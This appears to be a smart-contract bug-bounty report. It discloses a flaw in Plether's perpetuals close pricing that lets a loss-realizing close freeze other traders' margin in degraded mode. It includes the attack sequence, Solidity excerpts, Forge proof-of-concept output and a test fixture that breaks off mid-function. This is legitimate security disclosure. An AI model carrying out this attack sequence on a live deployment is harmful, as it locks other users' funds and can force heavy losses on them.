# \#99374 [SC-High] Near-Zero Claim-Net Depth in Close VPI Pricing Lets a Losing Close Freeze Other Traders' Margin in Degraded Mode

**Submitted on Nov 13th 2026 at 12:05:51 UTC by @zer0luck_xint for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99374
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

## Brief/Intro

Close orders pay virtual price impact (VPI) priced on the depth of HousePool assets `P` net of outstanding trader claims `C`, `max(P - C, 0)`, and the close flow skips fresh VPI only when that depth is exactly zero. The VPI curve divides the squared skew by depth, so at a small positive depth a close that increases skew can be charged several times its own notional.

After trader claims reach HousePool assets and degraded mode has latched, a trader on the dominant side (the side with the larger open size) can realize part of a losing position so that pool assets end just above trader claims. A close by a trader on the minority side that increases the absolute skew is then refused when its `maxActionChargeAssets` is near its depth-0 quote. Degraded mode blocks every withdrawal from an account with an open position, so that trader's whole clearinghouse balance stays frozen while the depth stays there, unless it accepts a VPI charge of thousands of USDG to exit.

## Vulnerability Details

**Close VPI is priced on claim-net depth.** The close plan passes HousePool assets net of outstanding trader claims to `CloseAccountingLib.buildCloseState` as the VPI depth:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L1339-L1341

```solidity
                poolDepthAssets: PositionRiskAccountingLib.computeNetPoolDepthAssets(
                    snap.poolAssets, snap.totalTraderClaimBalanceAssets
                ),
```

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/PositionRiskAccountingLib.sol#L21-L26

```solidity
        return physicalAssets > traderClaimsAssets ? physicalAssets - traderClaimsAssets : 0;
```

**Fresh VPI is skipped only at exactly zero depth.** `buildCloseState` computes fresh VPI for every nonzero depth:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L105-L111

```solidity
        // With no economic depth, keep protective exits live without creating a fresh charge or rebate.
        // The lifetime clamp below still recovers any previously received negative VPI.
        if (inputs.poolDepthAssets != 0) {
            state.vpiDeltaAssets = CfdMath.calculateVPI(
                inputs.preSkewAssets, inputs.postSkewAssets, inputs.poolDepthAssets, inputs.vpiFactor
            );
        }
```

The VPI of a trade is the change in the skew cost `cost(S) = 0.5 * k * S^2 / D` at depth `D` and VPI factor `k` (CfdMath.sol:96-139, :164-180). A close that raises the absolute skew from `S_pre` to `S_post` is charged `0.5 * k * (S_post^2 - S_pre^2) / D`. The charge is 0 at `D = 0` and grows without limit as `D` approaches 0 from above.

**The trader's charge bound refuses the close.** The close action charge is the VPI plus the execution fee, the frozen close spread and carry (CfdEnginePlanLib.sol:1041-1047). The policy evaluator rejects the order when that charge exceeds the trader's `maxActionChargeAssets`:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdOrderPolicyEvaluatorBase.sol#L509-L513

```solidity
        _requireMaximum(
            OrderV3Types.ConstraintKind.ActionCharge,
            assessment.actionChargeAssessedAssets,
            bounds.maxActionChargeAssets
        );
```

OrderRouter classifies this policy rejection as terminal (OrderRouterExecutionSidecar.sol:879-893), so each refused close is final and the trader has to commit a new one. By design, the position-protection builders require explicit close limits, including `maxActionChargeAssets`, and reserve an unlimited value for intentionally unlimited authority (packages/perps-aa-client/README.md:208-214).

**Degraded mode blocks every withdrawal while the position is open.** `MarginClearinghouse.withdrawMargin` calls the engine's withdrawal check (MarginClearinghouse.sol:463-465, CfdEngine.sol:730-748), which reverts in degraded mode for any account with an open position:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L274-L276

```solidity
        if (engine.degradedMode()) {
            revert ICfdEngineTypes.CfdEngine__DegradedMode();
        }
```

A trader's own trader claim is settled into the same clearinghouse account (CfdEngine.sol:572-586, :233-244). In degraded mode a trader with an open position therefore recovers its balance only by closing the position, and degraded mode keeps such protective transitions available while it blocks risk expansion (packages/perps/SECURITY.md:340).

**The exemption covers only zero depth.** By design, VPI depends on HousePool assets net of outstanding trader claims, claim payment alone cannot change that depth, and protective closes create no fresh VPI charge or rebate at zero depth (packages/perps/SECURITY.md:1438-1440). The net-depth basis was added, and the zero-depth close rule made explicit, in commit 6d6622f2 (Plether-Fi/plether-core#118) so that outstanding trader claims no longer count as risk capacity while protective exits stay live. The defect reported here is introduced by that change. Before it, close VPI used gross HousePool assets as depth, which do not approach zero when trader claims approach pool assets. With claim-net depth, a loss realization can leave a small positive `P - C`, which the zero-depth exemption does not cover. The refusal does not come from missing liquidity: at depth 0 the same close executes, and in degraded mode LP deposits are closed (HousePool.sol:1139-1145). Voluntary closes use the same signed VPI curve in live, FAD-only and oracle-frozen markets (packages/perps/SECURITY.md:1441). The VPI limitations cover the net-depth basis, the shared curve and zero depth; none of them covers this refusal of protective exits at a small positive depth.

**Trigger.** Once trader claims are at least HousePool assets, depth is 0 and closes execute without fresh VPI. A trader holding a losing position on the dominant side commits a partial close whose realized loss lifts HousePool assets just above trader claims. Order execution is permissionless and processes the global queue in FIFO order (OrderRouter.sol:249-263), so when that close is queued ahead of a victim's close, any executor runs the loss realization first and the victim's close is assessed at the new depth in the same transaction. A retried bounded close is refused for as long as the depth stays there.

## Impact Details

Severity: High, Temporary freezing of funds for at least 24 hours.

A trader on the minority side that keeps its close bounded has its whole clearinghouse balance frozen (168 hours in the test). From the depth the attacker's partial close leaves (the parked depth), the exit sequences the test runs leave the victim 5,616.78 USDG (split exit) to 39,815.06 USDG (unlimited bound) below the depth-0 control, in which the same close executes at depth 0.

In the release deployment with release parameters, the victim's full SHORT close of 24,875.00 USDG notional is quoted at 9.95 USDG at depth 0, and the victim sets `maxActionChargeAssets` to that quote plus 1% of notional, 258.70 USDG. In the control the close executes and the victim withdraws its whole clearinghouse balance of 29,950.01 USDG. In the attack, a partial close of the attacker's losing LONG is queued ahead and executes first in the same transaction, depth becomes 54.77 USDG, and the same close is assessed 124,271.84 USDG, of which 124,261.89 USDG is VPI (the VPI of the fresh quote at that depth). The close is refused, and the victim cannot withdraw its balance or even 1 atom of it.

| | Control (depth 0) | Attack (after the attacker's partial close) |
|---|---:|---:|
| HousePool assets / trader claims | 17,785.16 / 33,530.41 | 33,585.18 / 33,530.41 |
| Claim-net depth | 0.00 | 54.77 |
| Victim's full close: charge assessed against the 258.70 bound | 9.95, executed | 124,271.84, refused |
| VPI in that charge (attack: fresh quote at the same depth) | 0.00 | 124,261.89 |
| Withdrawal of the victim's 29,950.01 clearinghouse balance | succeeds | reverts |
| Hourly bounded retries over the next 168 hours | | 168 refused, 0 executed |

The freeze persists while the attacker takes no further action and the basket stays fixed. After another trader settles its trader claim, the victim retries every hour for 168 hours with a full close bounded at the fresh quote without its VPI plus 1% of notional. Each hour, addresses with no role refresh the mark, checkpoint carry and attempt LP epoch settlement. Each of the 168 retries is assessed the same 124,261.89 USDG of VPI and refused, no withdrawal succeeds at any hour, and after 168 hours depth is still 54.77 USDG and the victim's 29,950.01 USDG is still locked in its clearinghouse account. In 47 of those hours the oracle market is closed, so the frozen close spread enters both the quote and the bound, and those retries are refused the same way. Close orders carry no execution bounty (packages/perps/DEPLOYMENT.md:150), and no bounty is paid on any refused retry; the first refusal leaves the victim's wealth and the executor's balance unchanged.

Every exit sequence the test starts from the parked depth pays VPI far above 1% of the notional it closes. With an unlimited `maxActionChargeAssets` the full close executes, is assessed 124,271.84 USDG and collects the victim's whole clearinghouse balance of 29,950.01 USDG. The victim ends 39,815.06 USDG below the depth-0 control, the sum of that balance and the 9,865.05 USDG the control close credits. HousePool assets net of trader claims, together with the USDG held by the Senior and Junior tranche vaults, rise by 29,940.06 USDG (`LP equity change` in the test output).

The smallest partial close the router accepts at this mark, 1,194.00 USDG notional above the 1,000 USDG minimum (OrderLiquidationBatchLogic.sol:356-364), carries 3,383.54 USDG of VPI and is refused at a bound of its quote without VPI plus 1% of its notional (12.42 USDG). Executed instead with a bound equal to its own quote, that partial close is assessed 3,384.02 USDG, and the 2,910.02 USDG it collects lifts depth to 2,964.79 USDG. The remaining close, bounded at its own quote, is then assessed 2,242.71 USDG and executes. This split exit, the cheapest sequence tested, leaves the victim 5,616.78 USDG below the depth-0 control, 57% of the profit the control close credits.

Settling the victim's own trader claim moves 11,838.06 USDG into the same clearinghouse account, 41,788.07 USDG in total, leaves depth unchanged, and the bounded close is still refused.

Prerequisites:
- Trader claims at least equal to HousePool assets, with degraded mode latched. A profitable close whose payout exceeds free pool cash creates a trader claim instead of a payment (CfdEnginePlanLib.sol:960-967), and degraded mode latches when a close leaves effective assets below the maximum directional liability (CfdEngine.sol:1355-1368). By design, the maximum directional payout envelope is an endpoint liability bound and not a pathwise reserve, so a profitable close can reduce pool cash while another position still determines the maximum liability (Plether-Fi/plether-core#74). In the test this state follows a Junior redemption of 95% of its shares and a basket move from 1.20 to 0.30 and then to 1.99, below the 2.00 cap price; trader claims are then 33,530.41 USDG against 17,785.16 USDG of HousePool assets. That state comes from realized trader profits on both sides that together exceed the pool left after LP redemptions, which takes large basket moves in both directions; the test compresses them into the moves above.
- A losing position on the dominant side that its holder partly realizes. In the test the attacker's partial close realizes 15,800.00 USDG of the loss its LONG already carried at the 1.99 mark. The partial close is an ordinary close order, so a trader that realizes a loss of that size for its own reasons leaves the same depth with no attacker involved. A realization that leaves claim-net depth small relative to the skew can produce the same refusal, since the charge scales with `1 / D`.
- A victim with an open position on the minority side, whose close increases the absolute skew.
- Duration. The attacker holds the depth by keeping the other half of its LONG open. Closing that half also raises the absolute skew at the parked depth: in the test that close is assessed 33,242.16 USDG, collects 8,364.66 USDG of that charge and takes the attacker's clearinghouse balance from 24,164.66 USDG to 0. Depth then rises to 24,203.51 USDG and the victim's bounded close executes with a 16.63 USDG VPI rebate. The refusal also ends when HousePool assets rise far enough above trader claims, for example through another trader's loss realization or an owner recapitalization, and withdrawals resume after `clearDegradedMode`, which requires raw solvency (CfdEngine.sol:658-667). None of these occurs in the test. The trader can end the freeze at any time by accepting the VPI loss of an executable exit described above; once its position is flat, withdrawals no longer check degraded mode (CfdEngineSettlementSidecar.sol:261-273).
- Attacker cost and gain. The attacker's clearinghouse balance falls by 15,815.94 USDG at the partial close: the realized loss plus the 15.92 USDG execution fee and carry. The test does not measure Arbitrum gas or Pyth update fees. The attacker then carries price risk on the LONG it keeps open, and it gains nothing from a victim that keeps a bounded close.
- After the release deployment and its owner setup steps (seed positions and trading activation), no privileged role or unusual configuration is involved, and every call in the scenario is a public function. The basket prices come from the repository's `MockPyth` at the release Pyth address: all 6 feeds move together from 1.20 to 0.30 and then to 1.99 with zero confidence, which the oracle accepts. The test does not replay authentic signed Pyth updates for these moves, and their size is the main feasibility limit of the claims state.

## Recommendation

Extend the zero-depth treatment of protective exits to small positive depths. When `CloseAccountingLib.buildCloseState` prices fresh VPI at a nonzero claim-net depth, use a depth of at least the post-close absolute skew. The fresh charge on a close is then at most `k` times the skew it adds (1% of the close notional at release parameters), however small the positive depth is. Alternatively, skip fresh positive VPI on closes whenever claim-net depth is below a floor tied to the close notional or to open interest, keeping the lifetime clamp unchanged. Either change leaves opens on the net-depth basis and keeps rebates on skew-reducing closes no larger than at the audit commit.

## References

- Audit commit: https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8
- Change that added the net-depth basis and made the zero-depth close rule explicit: Plether-Fi/plether-core#118 (commit 6d6622f2)
- VPI limitations and degraded containment: `packages/perps/SECURITY.md:1434-1444`, `packages/perps/SECURITY.md:340`
- Payout envelope as an endpoint liability bound: Plether-Fi/plether-core#74
- Release parameters: `packages/perps/DEPLOYMENT.md` (Initial release parameters) and `script/DeployPerpsArbitrumSepolia.s.sol`


## Proof of Concept

## Proof of Concept

The test deploys the release contracts with `script/DeployPerpsArbitrumSepolia.s.sol` inside Forge through `ReleaseFixture.sol` (source at the end of this section). In-scope contracts are unmodified. Only out-of-scope components are mocked:
- Pyth: the repository's `test/mocks/MockPyth.sol`, etched at the release Pyth address. All 6 feeds move together with zero confidence.
- USDG: the release `MockUSDG`.
- The ArbSys block-number precompile.

The victim's commit-time quotes come from `CfdClosePreview.previewClose`, the close preview deployed by the release script. Every order is executed by an address with no role, on a price published after the commit: through `OrderRouter.executeOrder` in `setUp` and through `OrderRouter.executeOrderBatch` in the test steps. `setUp` builds the shared claims state for all 3 tests in `NearZeroDepthCloseVpiFreeze.t.sol` through public entry points:

1. A Junior LP deposits 200,000 USDG and a Senior LP 30,000 USDG at a 1.20 basket. 5 traders open, with sizes in synthetic tokens (1 lot is 100 synthetic tokens): a LONG of 30,000, a SHORT of 50,000, the attacker's LONG of 40,000, a SHORT of 27,500 for a later claimant, and the victim's SHORT of 27,500.
2. The Junior LP redeems 95% of its shares at the next LP epoch.
3. The basket falls to 0.30 and the first LONG closes in profit. The basket rises to 1.99, and the SHORT of 50,000, the claimant's SHORT and 15,000 of the victim's 27,500 close in profit. Payouts above free pool cash become trader claims, and degraded mode is latched in the resulting claims state.

`test_nearZeroDepthRefusesBoundedCloseAndLocksBalanceFor168Hours` compares the control and attack from that state:

1. Control, from a snapshot: the victim quotes a full close of its remaining 12,500, sets `maxActionChargeAssets` to the quote plus 1% of notional, and the close executes. The victim then withdraws its whole clearinghouse balance.
2. Attack, from the same snapshot: the attacker commits a close of 20,000 of its 40,000 LONG without a charge bound. The victim then quotes (the quote is unchanged) and commits the same bounded full close. One batch executes both in FIFO order, leaving a claim-net depth of 54.77 USDG (the parked depth).
3. The flat claimant settles its trader claim. Every hour for 168 hours, one address with no role refreshes the mark and a second one checkpoints carry and attempts LP epoch settlement. The victim then reads a fresh quote and commits a full close bounded at the quote without its VPI (execution fee, carry and frozen close spread) plus 1% of notional, and the second address runs the execution batch.
4. The attacker closes its remaining 20,000 without a charge bound. That close also raises the absolute skew at the parked depth, and its realized loss and charge take the attacker's clearinghouse balance to 0. The victim's bounded full close then executes.

The test checks the exact claims state, the control quote, bound, execution, wealth change and full withdrawal, and the attacker's realized loss, fee and balance change. After the batch it checks the exact depth, the exact refused charge and bound, unchanged victim wealth and executor balance, and failed withdrawals of the whole balance and of 1 atom. For each of the 168 retries it checks the exact fresh VPI, a refused charge equal to the fresh quote, a bound equal to the control bound plus the frozen close spread, and a failed withdrawal. It then checks the elapsed 168 hours, the unchanged depth, degraded mode and balance, and the depth and VPI rebate after the attacker exits.

`test_onlyExecutableBoundForfeitsWholeBalance` parks the same depth. It checks the refusal of the smallest partial close the router accepts (size 600, 6 lots) with its exact notional, VPI, charge and bound. After the victim settles its own trader claim, it checks that the bounded full close is still refused, that depth is unchanged and that the 41,788.07 USDG balance is locked. With an unlimited `maxActionChargeAssets`, it checks the executed close with its exact assessed and collected charge and the victim's wealth change against the depth-0 control. It also checks the change in HousePool assets net of trader claims plus the USDG held by the Senior and Junior tranche vaults (`LP equity change`).

`test_splitExitStillLosesThousands` parks the same depth and executes the smallest partial close the router accepts (size 600) with `maxActionChargeAssets` equal to its own quote, checking its charge and the depth after it. It then executes the remaining close bounded at its own quote and checks the victim's wealth against the depth-0 control.

On a fresh clone of the audit commit, run `git submodule update --init --recursive`. Create `test/poc/` at the repository root, place `ReleaseFixture.sol` and `NearZeroDepthCloseVpiFreeze.t.sol` (sources at the end of this section) in it, then run from the repository root with Forge 1.5.1:

```bash
forge test --match-path test/poc/NearZeroDepthCloseVpiFreeze.t.sol -vv
```

Excerpt from the output of the command above for `test_nearZeroDepthRefusesBoundedCloseAndLocksBalanceFor168Hours` (deployment lines omitted):

```
[PASS] test_nearZeroDepthRefusesBoundedCloseAndLocksBalanceFor168Hours() (gas: 335731834)
Logs:
  == claims state at basket 1.99
     HousePool assets P 17785.160990 USDG
     trader claims C 33530.409810 USDG
     claim-net depth max(P - C, 0) 0.000000 USDG
     degraded mode true
     victim / attacker size 12500 40000
  victim SHORT close notional 24875.000000 USDG
  victim clearinghouse balance / trader claim 29950.013642 USDG 11838.060000 USDG
  CONTROL quoted close charge 9.950000 USDG
  CONTROL quoted close VPI 0.000000 USDG
  victim bound: quote + 1% of notional 258.700000 USDG
  -- CONTROL victim close
     Executed; charge assessed / collected 9.950000 USDG 0.000000 USDG
     VPI / execution fee 0.000000 USDG 9.950000 USDG
  CONTROL victim wealth change 9865.050000 USDG
  CONTROL victim withdraws its whole clearinghouse balance 29950.013642 USDG
  == after the batch
     HousePool assets P 33585.184625 USDG
     trader claims C 33530.409810 USDG
     claim-net depth max(P - C, 0) 54.774815 USDG
     degraded mode true
     victim / attacker size 12500 20000
  -- ATTACKER partial close (size 20000 of 40000), executed first; status (2 Executed) 2
     realized PnL / execution fee -15800.000000 USDG 15.920000 USDG
     attacker clearinghouse balance change -15815.943635 USDG
  -- ATTACK victim close
     status / reason / constraint (3 Failed, 8 ConstraintViolation, 4 ActionCharge) 3 8 4
     assessed charge / maxActionChargeAssets 124271.837055 USDG 258.700000 USDG
  ATTACK victim wealth change / executor change 0.000000 USDG 0.000000 USDG
  ATTACK victim can withdraw its balance / 1 atom false false
  #### hour 1
     fresh quoted close charge / VPI 124271.837055 USDG 124261.887055 USDG
     claim-net depth 54.774815 USDG
  -- retry
     status / reason / constraint (3 Failed, 8 ConstraintViolation, 4 ActionCharge) 3 8 4
     assessed charge / maxActionChargeAssets 124271.837055 USDG 258.700000 USDG
     victim can withdraw 1 atom false
  #### hour 24
     fresh quoted close charge / VPI 124271.837055 USDG 124261.887055 USDG
     claim-net depth 54.774815 USDG
  -- retry
     status / reason / constraint (3 Failed, 8 ConstraintViolation, 4 ActionCharge) 3 8 4
     assessed charge / maxActionChargeAssets 124271.837055 USDG 258.700000 USDG
     victim can withdraw 1 atom false
  #### hour 168
     fresh quoted close charge / VPI 124271.837055 USDG 124261.887055 USDG
     claim-net depth 54.774815 USDG
  -- retry
     status / reason / constraint (3 Failed, 8 ConstraintViolation, 4 ActionCharge) 3 8 4
     assessed charge / maxActionChargeAssets 124271.837055 USDG 258.700000 USDG
     victim can withdraw 1 atom false
  hourly retries refused 168
     of which with the market closed (frozen close spread in the bound) 47
  hours since the first refusal 168
  victim size / clearinghouse balance 12500 29950.013642 USDG
  == after the attacker closes its residual
     HousePool assets P 36041.571180 USDG
     trader claims C 11838.060000 USDG
     claim-net depth max(P - C, 0) 24203.511180 USDG
     degraded mode true
     victim / attacker size 12500 0
  -- ATTACKER residual close
     Executed; charge assessed / collected 33242.158687 USDG 8364.656365 USDG
     VPI / execution fee 33221.411881 USDG 15.920000 USDG
     attacker clearinghouse balance before / after 24164.656365 USDG 0.000000 USDG
  -- victim close after the attacker exits
     Executed; charge assessed / collected 0.000000 USDG 0.000000 USDG
     VPI / execution fee -16.630163 USDG 9.950000 USDG
```

Excerpt from the same output for `test_onlyExecutableBoundForfeitsWholeBalance` (deployment lines omitted):

```
[PASS] test_onlyExecutableBoundForfeitsWholeBalance() (gas: 8163032)
Logs:
  smallest partial close (size 600): notional / quoted VPI 1194.000000 USDG 3383.538219 USDG
  -- smallest partial close
     status / reason / constraint (3 Failed, 8 ConstraintViolation, 4 ActionCharge) 3 8 4
     assessed charge / maxActionChargeAssets 3384.015819 USDG 12.417600 USDG
  victim settles its own claim; clearinghouse balance 41788.073642 USDG
  claim-net depth 54.774815 USDG
  -- bounded close after the victim settles its own claim
     status / reason / constraint (3 Failed, 8 ConstraintViolation, 4 ActionCharge) 3 8 4
     assessed charge / maxActionChargeAssets 124271.837055 USDG 258.700000 USDG
  -- close with unlimited maxActionChargeAssets
     Executed; charge assessed / collected 124271.837055 USDG 29950.013642 USDG
     VPI / execution fee 124261.887055 USDG 9.950000 USDG
  victim wealth change -29950.013642 USDG
  victim wealth vs the depth-0 control close -39815.063642 USDG
  LP equity change 29940.063642 USDG
```

Excerpt from the same output for `test_splitExitStillLosesThousands` (deployment lines omitted) and the suite summary:

```
[PASS] test_splitExitStillLosesThousands() (gas: 5322767)
Logs:
  -- smallest partial close (size 600) bounded at its own quote
     Executed; charge assessed / collected 3384.015819 USDG 2910.015819 USDG
     VPI / execution fee 3383.538219 USDG 0.477600 USDG
     claim-net depth after 2964.790634 USDG
  -- remaining close (size 11900) bounded at its own quote
     Executed; charge assessed / collected 2242.712454 USDG 0.000000 USDG
     VPI / execution fee 2233.240054 USDG 9.472400 USDG
  victim wealth vs the depth-0 control close -5616.778273 USDG

Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 1.15s (1.13s CPU time)
```

### Source files

#### `ReleaseFixture.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// Deploys the release contracts with script/DeployPerpsArbitrumSepolia.s.sol inside Forge.
// Pyth, USDG and ArbSys are replaced by local test components; in-scope contracts are unmodified.

import {DeployPerpsArbitrumSepolia} from "../../script/DeployPerpsArbitrumSepolia.s.sol";
import {MockPyth} from "../mocks/MockPyth.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {Test, console2} from "forge-std/Test.sol";

/// @dev Mirrors the Arbitrum precompile's block-number view inside the local test EVM.
contract ReleaseFixtureArbSys {

    function arbBlockNumber() external view returns (uint256) {
        return block.number;
    }

}

abstract contract ReleaseFixture is Test {

    address internal constant RELEASE_PYTH = 0x0B73614636C855Bf23F342F307FB981A3e47f42B;
    uint256 internal constant DEPLOYER_KEY = 0xA11CE;
    uint256 internal constant MONDAY_MORNING = 1_709_532_000; // Mon 2024-03-04 06:00 UTC (live market)
    uint256 internal constant BASKET_1_20 = 120_000_000; // normalized basket mark 1.20 (8 decimals)
    uint8 internal constant MODE_LIVE = 1;
    uint8 internal constant MODE_FAD = 2;
    uint8 internal constant MODE_FROZEN = 4;
    uint8 internal constant MODE_ANY = 7;

    DeployPerpsArbitrumSepolia.DeployedContracts internal d;
    address internal owner;
    address internal keeper = makeAddr("keeper");
    uint256 internal clientNonce;

    function setUp() public virtual {
        vm.chainId(421_614);
        vm.warp(MONDAY_MORNING);
        ReleaseFixtureArbSys arbSys = new ReleaseFixtureArbSys();
        vm.etch(address(100), address(arbSys).code);
        MockPyth pyth = new MockPyth();
        vm.etch(RELEASE_PYTH, address(pyth).code);
        vm.setEnv("TEST_PRIVATE_KEY", vm.toString(DEPLOYER_KEY));
        d = DeployPerpsArbitrumSepolia(deployCode("DeployPerpsArbitrumSepolia.s.sol:DeployPerpsArbitrumSepolia")).run();
        owner = vm.addr(DEPLOYER_KEY);

        // Permanent 1 USDG seeds per tranche (release values), then activation.
        d.settlementToken.mint(owner, 2e6);
        vm.startPrank(owner);
        d.settlementToken.approve(address(d.housePool), 2e6);
        d.housePool.initializeSeedPosition(false, 1e6, owner);
        d.housePool.initializeSeedPosition(true, 1e6, owner);
        d.housePool.activateTrading();
        vm.stopPrank();

        _setBasketPrices(BASKET_1_20);
        d.router.updateMarkPrice(_updateData());
    }

    // ---------------------------------------------------------------- prices

    function _oracle() internal view returns (PletherOracle) {
        return PletherOracle(d.pletherOracle);
    }

    /// @dev Sets all six feeds so the normalized basket equals `basketPrice`, published at the current block time.
    function _setBasketPrices(
        uint256 basketPrice
    ) internal {
        _setBasketPricesAt(basketPrice, vm.getBlockTimestamp());
    }

    function _setBasketPricesAt(
        uint256 basketPrice,
        uint256 publishTime
    ) internal {
        for (uint256 i; i < 6; ++i) {
            _setFeed(i, basketPrice, publishTime);
        }
    }

    /// @dev Sets one component so that it alone would give normalized basket `basketPrice`, at `publishTime`.
    function _setFeed(
        uint256 i,
        uint256 basketPrice,
        uint256 publishTime
    ) internal {
        PletherOracle oracle = _oracle();
        uint256 normalizedPrice = oracle.basePrices(i) * basketPrice / 1e8;
        uint256 feedPrice = oracle.inversions(i) ? 1e16 / normalizedPrice : normalizedPrice;
        MockPyth(RELEASE_PYTH).setPrice(oracle.pythFeedIds(i), int64(uint64(feedPrice)), int32(-8), publishTime);
    }

    /// @dev Same as _setFeed with an explicit confidence (in feed units).
    function _setFeedWithConf(
        uint256 i,
        uint256 basketPrice,
        uint64 conf,
        uint256 publishTime
    ) internal {
        PletherOracle oracle = _oracle();
        uint256 normalizedPrice = oracle.basePrices(i) * basketPrice / 1e8;
        uint256 feedPrice = oracle.inversions(i) ? 1e16 / normalizedPrice : normalizedPrice;
        MockPyth(RELEASE_PYTH).setPrice(oracle.pythFeedIds(i), int64(uint64(feedPrice)), conf, int32(-8), publishTime);
    }

    /// @dev A non-encoded payload makes the MockPyth double use the configured per-feed prices.
    function _updateData() internal pure returns (bytes[] memory data) {
        data = new bytes[](1);
        data[0] = "";
    }

    function _refreshMark(
        uint256 basketPrice
    ) internal {
        _setBasketPrices(basketPrice);
        vm.prank(keeper);
        d.router.updateMarkPrice(_updateData());
    }

    // ---------------------------------------------------------------- time

    function _warp(
        uint256 dt
    ) internal {
        vm.warp(vm.getBlockTimestamp() + dt);
        vm.roll(vm.getBlockNumber() + 1 + dt / 4);
    }

    function _warpTo(
        uint256 t
    ) internal {
        uint256 nowTs = vm.getBlockTimestamp();
        require(t >= nowTs, "warp back");
        vm.roll(vm.getBlockNumber() + 1 + (t - nowTs) / 4);
        vm.warp(t);
    }

    // ---------------------------------------------------------------- USDG and LPs

    function _mint(
        address to,
        uint256 amount
    ) internal {
        d.settlementToken.mint(to, amount);
    }

    function _vault(
        bool senior
    ) internal view returns (TrancheVault) {
        return senior ? d.seniorVault : d.juniorVault;
    }

    function _requestDeposit(
        bool senior,
        address lp,
        uint256 assets
    ) internal returns (uint256 requestId) {
        TrancheVault v = _vault(senior);
        _mint(lp, assets);
        vm.startPrank(lp);
        d.settlementToken.approve(address(v), assets);
        requestId = v.requestDeposit(assets, lp, lp);
        vm.stopPrank();
    }

    /// @dev Warps to the request's epoch start (if not past) and settles through the Router's atomic oracle route.
    function _settleEpoch(
        uint256 requestId,
        uint256 basketPrice
    ) internal {
        uint256 start = d.housePool.lpEpochStart(requestId);
        if (vm.getBlockTimestamp() < start) {
            _warpTo(start);
        }
        _setBasketPrices(basketPrice);
        vm.prank(keeper);
        d.router.settleLpEpoch(_updateData());
    }

    function _claimDeposit(
        bool senior,
        address lp,
        uint256 requestId
    ) internal returns (uint256 shares) {
        TrancheVault v = _vault(senior);
        uint256 claimable = v.claimableDepositRequest(requestId, lp);
        vm.prank(lp);
        shares = v.claimDeposit(requestId, claimable, lp, lp);
    }

    /// @dev Request, settle at `basketPrice`, claim. Returns shares.
    function _lpDeposit(
        bool senior,
        address lp,
        uint256 assets,
        uint256 basketPrice
    ) internal returns (uint256 shares) {
        uint256 requestId = _requestDeposit(senior, lp, assets);
        _settleEpoch(requestId, basketPrice);
        shares = _claimDeposit(senior, lp, requestId);
    }

    function _requestRedeem(
        bool senior,
        address lp,
        uint256 shares
    ) internal returns (uint256 requestId) {
        vm.prank(lp);
        requestId = _vault(senior).requestRedeem(shares, lp, lp);
    }

    function _claimRedeem(
        bool senior,
        address lp,
        uint256 requestId
    ) internal returns (uint256 assets) {
        TrancheVault v = _vault(senior);
        uint256 shares = v.claimableRedeemRequest(requestId, lp);
        vm.prank(lp);
        assets = v.claimRedeem(requestId, shares, lp, lp);
    }

    // ---------------------------------------------------------------- traders

    function _fundTrader(
        address trader,
        uint256 assets
    ) internal {
        _mint(trader, assets);
        vm.startPrank(trader);
        d.settlementToken.approve(address(d.clearinghouse), assets);
        d.clearinghouse.depositMargin(assets);
        vm.stopPrank();
    }

    /// @dev Permissive bounds: no practical ceilings (zero means zero, so ceilings use max values).
    function _bounds(
        uint8 modes
    ) internal view returns (OrderV3Types.ExecutionBounds memory b) {
        b.submitBy = uint64(vm.getBlockTimestamp() + 60);
        b.executionWindowSeconds = 60;
        b.allowedExecutionModes = modes;
        b.expectedConfigHash = d.lifecycleBook.currentExecutionConfigHash();
        b.maxExecutionBountyAssets = type(uint256).max;
        b.maxExecutionNotionalAssets = type(uint256).max;
        b.maxGrossAccountDebitAssets = type(uint256).max;
        b.maxActionChargeAssets = type(uint256).max;
        b.maxExplicitFeesAssets = type(uint256).max;
        b.maxPostPositionSize = type(uint256).max;
        b.minPostSettlementBalanceAssets = 0;
        b.minPostPositionEquityAssets = 0;
        b.maxPostLeverageBps = type(uint32).max;
    }

    function _nextClientId() internal returns (bytes32) {
        return bytes32(uint256(keccak256(abi.encode("poc", ++clientNonce))));
    }

    /// @param size synthetic size in 1e18 units; must be a multiple of 100e18 (positionSizeQuantum 1e20).
    function _openReq(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 targetPrice
    ) internal returns (OrderV3Types.OrderRequest memory r) {
        r.clientOrderId = _nextClientId();
        r.side = side;
        r.sizeDelta = size;
        r.marginDelta = margin;
        r.targetPrice = targetPrice;
        r.isClose = false;
        r.bounds = _bounds(MODE_LIVE | MODE_FAD);
    }

    function _closeReq(
        CfdTypes.Side side,
        uint256 size,
        uint256 targetPrice
    ) internal returns (OrderV3Types.OrderRequest memory r) {
        r.clientOrderId = _nextClientId();
        r.side = side;
        r.sizeDelta = size;
        r.marginDelta = 0;
        r.targetPrice = targetPrice;
        r.isClose = true;
        r.bounds = _bounds(MODE_ANY);
    }

    function _commit(
        address trader,
        OrderV3Types.OrderRequest memory r
    ) internal returns (uint64 orderId) {
        vm.prank(trader);
        orderId = d.router.commitOrder(r);
